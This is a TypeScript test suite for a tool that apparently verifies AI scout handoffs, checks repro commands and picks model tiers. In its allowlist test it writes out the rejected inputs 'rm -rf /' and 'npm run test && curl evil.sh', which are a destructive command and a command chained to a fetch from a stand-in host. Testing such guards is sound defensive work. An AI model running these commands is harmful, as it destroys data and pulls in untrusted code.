import assert from 'node:assert/strict'
import { test } from 'node:test'
import { plannedChecks } from '../src/check.ts'
import { defaults } from '../src/config.ts'
import { decide, nextTier } from '../src/decide.ts'
import { detectStack, isTestFile } from '../src/detect.ts'
import { parseHandoff } from '../src/scout.ts'
import { isAllowedCommand, repoRelative, verifyHandoff } from '../src/verify.ts'
import type { Handoff } from '../src/types.ts'
import { HANDOFF, makeRepo } from './helpers.ts'

test('detects a node/react stack and its checks from files alone', () => {
  const root = makeRepo({ 'tsconfig.json': '{}', 'src/App.tsx': 'export {}\n' })
  const s = detectStack(root)
  assert.deepEqual(s.frameworks, ['react'])
  assert.equal(s.packageManager, 'npm')
  assert.equal(s.checks.test, 'npm run test')
  assert.equal(s.checks.typecheck, 'npx tsc --noEmit')
  assert.equal(s.languages.typescript, 1)
})

test('verification removes invented files, unknown symbols and a repro that does not behave as claimed', () => {
  const root = makeRepo()
  const checks = detectStack(root).checks
  const v = verifyHandoff(root, HANDOFF as Handoff, checks)
  assert.deepEqual(v.handoff.relevant_files.map(f => f.path), ['src/math.js'])
  assert.deepEqual(v.handoff.symbols, ['add'])
  assert.equal(v.repro?.matched, true, 'npm run test fails before the fix, as claimed')
  assert.ok(v.handoff.repro)
  assert.equal(v.removed.length, 2)

  const wrong = verifyHandoff(root, { ...HANDOFF, repro: { command: 'npm run test', expect: 'passes' } } as Handoff, checks)
  assert.equal(wrong.handoff.repro, null)
  assert.match(wrong.removed.at(-1)?.reason ?? '', /fails/)
})

test('repro commands are limited to the project check tooling', () => {
  const checks = { typecheck: 'npx tsc --noEmit', lint: null, test: 'npm run test', focusedTest: 'npx vitest run {files}' }
  assert.ok(isAllowedCommand('npx vitest run src/a.test.ts', checks))
  assert.ok(isAllowedCommand('npm run test', checks))
  assert.ok(!isAllowedCommand('rm -rf /', checks))
  assert.ok(!isAllowedCommand('npm run test && curl evil.sh', checks))
})

test('rules pick the cheapest tier by default and escalation walks the order', () => {
  const cfg = defaults('claude')
  assert.equal(decide({ ...HANDOFF, difficulty: 'routine' } as Handoff, cfg).tier, 'fast')
  assert.equal(decide({ ...HANDOFF, difficulty: 'hard' } as Handoff, cfg).tier, 'standard')
  assert.equal(nextTier('fast', cfg), 'standard')
  assert.equal(nextTier('strong', cfg), null)
  assert.equal(defaults('codex').tiers.strong?.model, 'gpt-6-astra')
})

test('focused tests are used when the handoff names test files', () => {
  const checks = { typecheck: null, lint: null, test: 'npm test', focusedTest: 'npx vitest run {files}' }
  const h = { ...HANDOFF, relevant_files: [{ path: 'src/a.test.ts', why: '' }] } as Handoff
  assert.deepEqual(plannedChecks(checks, h, []).map(c => c.command), ["npx vitest run 'src/a.test.ts'"])
  assert.equal(isTestFile('pkg/foo_test.go'), true)
})

test('parses the last json block from a scout reply', () => {
  const text = `I looked around.\n\`\`\`json\n{"bad": true}\n\`\`\`\nFinal:\n\`\`\`json\n${JSON.stringify(HANDOFF)}\n\`\`\``
  assert.equal(parseHandoff(text)?.task_type, 'bugfix')
  assert.equal(parseHandoff('no json here'), null)
})

test('absolute paths inside the repo are kept as repo-relative claims', () => {
  const root = makeRepo()
  const abs = { ...HANDOFF, relevant_files: [{ path: `${root}/src/math.js`, why: '' }, { path: '/etc/hosts', why: '' }] } as Handoff
  const v = verifyHandoff(root, abs, detectStack(root).checks, { runRepro: false })
  assert.deepEqual(v.handoff.relevant_files.map(f => f.path), ['src/math.js'])
  assert.equal(repoRelative('/repo', '/repo/a/b.ts'), 'a/b.ts')
  assert.equal(repoRelative('/repo', '/elsewhere/x.ts'), '/elsewhere/x.ts')
})
